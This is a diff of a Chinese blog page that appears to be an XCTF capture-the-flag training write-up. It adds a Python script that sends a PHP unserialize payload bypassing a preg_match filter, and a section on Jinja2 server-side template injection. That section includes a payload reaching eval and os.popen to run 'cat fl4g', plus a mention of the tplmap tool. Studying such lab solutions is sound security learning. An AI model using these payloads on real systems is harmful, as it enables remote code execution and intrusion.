@@ -212,7 +212,7 @@
 
             <li class="collapse-level-0" collapse-level="0">
                 <a class="no-padding" href="/categories/Python学习/">
-                    Python学习 <span class="right">1 篇</span></a>
+                    Python学习 <span class="right">2 篇</span></a>
                 </a>
             </li>
 
@@ -294,7 +294,7 @@
 
 
             <div class="toc pink-link-context hide-on-med-and-down">
-    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#XCTF%E8%AE%AD%E7%BB%83write-up"><span class="section table-of-contents-text">XCTF训练write up</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1%E3%80%81%E8%BF%9B%E9%98%B6%E2%80%94Web-php-unserialize"><span class="section table-of-contents-text">1、进阶—Web_php_unserialize</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2%E3%80%81%E8%BF%9B%E9%98%B6%E2%80%94php-rce%EF%BC%88thinkphp5-0-RCE%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="section table-of-contents-text">2、进阶—php_rce（thinkphp5.0 RCE漏洞）</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#3%E3%80%81%E8%BF%9B%E9%98%B6%E2%80%94Web-php-include"><span class="section table-of-contents-text">3、进阶—Web_php_include</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#4%E3%80%81supersqli"><span class="section table-of-contents-text">4、supersqli</span></a></li></ol></li></ol>
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#XCTF%E8%AE%AD%E7%BB%83write-up"><span class="section table-of-contents-text">XCTF训练write up</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1%E3%80%81%E8%BF%9B%E9%98%B6%E2%80%94Web-php-unserialize"><span class="section table-of-contents-text">1、进阶—Web_php_unserialize</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2%E3%80%81%E8%BF%9B%E9%98%B6%E2%80%94php-rce%EF%BC%88thinkphp5-0-RCE%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="section table-of-contents-text">2、进阶—php_rce（thinkphp5.0 RCE漏洞）</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#3%E3%80%81%E8%BF%9B%E9%98%B6%E2%80%94Web-php-include"><span class="section table-of-contents-text">3、进阶—Web_php_include</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#4%E3%80%81supersqli"><span class="section table-of-contents-text">4、supersqli</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#5%E3%80%81python-template-injection"><span class="section table-of-contents-text">5、python template injection</span></a></li></ol></li></ol>
 </div>
 
 
@@ -308,6 +308,11 @@
 <p>2、绕过preg_match正则表达式的匹配。</p>
 <p>源码：<code>preg_match(&#39;/[oc]:\d+:/i&#39;, $var)</code>，匹配的是 -&gt; O/C : 任意数字：这种字符串，且大小写都可。这里我傻了，其实只要4前加一个+即可，Payload:</p>
 <p><code>?var = O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>
+<p>3、private属性经过序列化后的属性名是<code>%00类名%00属性名</code>，构造反序列化payload时这个ASCII码为0的字符不好手打，因为这其中涉及到很多编码问题。</p>
+<p>​    方法①：用php代码模拟序列化类后，进行字符串替换操作构造payload，再用base64函数加密，得到payload</p>
+<p>​    方法②：使用python构造payload其中ASCII码0的字符可以使用\x00代替，在python中<code>\x**</code>表示一个十六进制的ASCII码字符，<code>\***</code>表示一个八进制的ASCII码字符。对应脚本：    </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,base64</span><br><span class="line">url = <span class="string">&quot;http://220.249.52.133:56111&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;\x00Demo\x00file&quot;;s:8:&quot;fl4g.php&quot;;&#125;&#x27;</span></span><br><span class="line">data = base64.b64encode(payload)</span><br><span class="line">params = &#123;<span class="string">&quot;var&quot;</span> : data&#125;</span><br><span class="line">res = requests.get(url, params=params)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+
 <p><strong>Flag：</strong></p>
 <p><a target="_blank" rel="noopener" href="https://imgchr.com/i/dxG2ZT"><img src="https://s1.ax1x.com/2020/09/01/dxG2ZT.png" alt="dxG2ZT.png"></a></p>
 <h3 id="2、进阶—php-rce（thinkphp5-0-RCE漏洞）"><a href="#2、进阶—php-rce（thinkphp5-0-RCE漏洞）" class="headerlink" title="2、进阶—php_rce（thinkphp5.0 RCE漏洞）"></a>2、进阶—php_rce（thinkphp5.0 RCE漏洞）</h3><blockquote>
@@ -349,8 +354,28 @@
 <blockquote>
 <p>HANDLER…OPEN语句用于打开一个表，通过后续的HANDLER…READ语句建立读取表的通道。本表目标不会被其它线程共享，也不会关闭，直到线程调用</p>
 </blockquote>
+<h3 id="5、python-template-injection"><a href="#5、python-template-injection" class="headerlink" title="5、python template injection"></a>5、python template injection</h3><p>此题属于SSTI（Server-Side Template Injection），这种模板为了防止代码任意执行的问题设置了沙盒机制，但是还是有办法绕过，绕过方法见下面payload。（个人猜想）</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zz_Caleb/article/details/96480967">https://blog.csdn.net/zz_Caleb/article/details/96480967</a></p>
+<p>讲解SSTI：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/9415641.html">https://www.cnblogs.com/tr1ple/p/9415641.html</a></p>
+<p><strong>Python类的特殊属性</strong>：<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/library/stdtypes.html#special-attributes">https://docs.python.org/zh-cn/3.7/library/stdtypes.html#special-attributes</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">instance.__class__ 可以获取当前实例的类对象</span><br><span class="line">class.__base__    获取类的基类</span><br><span class="line">class.__bases__    获取元组形式的类的基类</span><br><span class="line">class.__mro__ 获得包括当前类的所有父类元组（可理解为一步一步解析找到基类）</span><br><span class="line">class.__subclasses__()    获得该类的所有子类</span><br></pre></td></tr></table></figure>
+
+<p><strong>Payload：</strong></p>
+<p>为了代码执行，我们需要使用os模块中的函数。<code>http://220.249.52.133:42543/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</code>可获得所有的类。os模块都是从warnings.catch_warnings类入手的，在所有模块中查找warnings.catch_warnings的位置，为第59个……详见XCTF题解</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">220.249</span><span class="number">.52</span><span class="number">.133</span>:<span class="number">42543</span>/&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat fl4g&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>SSTI注入工具</strong>：</p>
+<p>​    Tplmap：<a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p>
+<p>​    需要环境：PyYaml，使用pip下载</p>
+<p>​    <code>python2 tplmap.py -u XXXX</code></p>
 
                 
+<p class="pink-link-context">
+    <a href="/2020/09/11/%E9%98%B6%E6%AE%B5%E4%BA%94%E3%80%81Python/PythonFlask/" rel="next" title="">
+    上一篇：
+  </a>
+</p>
+
 
 
 <p class="pink-link-context">
